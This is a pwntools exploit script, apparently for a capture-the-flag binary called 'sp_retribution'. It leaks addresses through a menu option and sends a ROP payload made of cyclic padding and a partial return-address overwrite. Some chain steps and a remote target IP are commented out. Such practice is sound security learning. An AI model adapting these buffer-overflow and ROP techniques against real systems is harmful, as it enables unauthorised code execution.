from pwn import *

app = ELF('sp_retribution')
libc = ELF('./glibc/libc.so.6')


missle_addr = 0x0a22
poprdi = 0x0d33

rop = ROP(app)

g = cyclic_gen()
prefix = g.get(0x75)
rop.raw(prefix)
#rop.raw(b'\x22\x0a')
rop.raw(b'\x22\x0a')
#rop.raw(p64(rop.rdi.address))
#rop.raw(p64(poprdi))
#rop.raw(p64(app.got.printf))
#rop.raw(p64(app.symbols.puts))
#rop.raw(p64(missle_addr))

p = process('sp_retribution')
#p = remote('178.62.119.24',31040)
counter = 0
def option2(payload: bytes):
    global counter
    counter += 1
    p.recvuntil(b"\x3e\x3e")
    p.sendline(b"2")
    p.recvline()
    p.recvline()
    p.recvuntil(b"y =")
    p.sendline(8*bytes([counter]))
    buff = p.recvuntil(b'(y/n):')
    print(buff)
    s = buff.find(b'y = ')
    e = buff.find(b'\n[*]', s)
    #print(f"{s=}, {e=}")
    p.sendline(payload)
    val = buff[s+4+8:e]
    return u64(val+(8-len(val))*b'\x00')

def option1():
    p.recvuntil(b"\x3e\x3e")
    p.sendline(b"1")

addr = option2(b'n')
print(f"{hex(addr)=}")
option1()
option1()
option1()
addr = option2(b'n')
print(f"{hex(addr)=}")
addr = option2(b'n')
print(f"{hex(addr)=}")
addr = option2(b'n')
print(f"{hex(addr)=}")
option2(bytes(rop))

p.interactive()
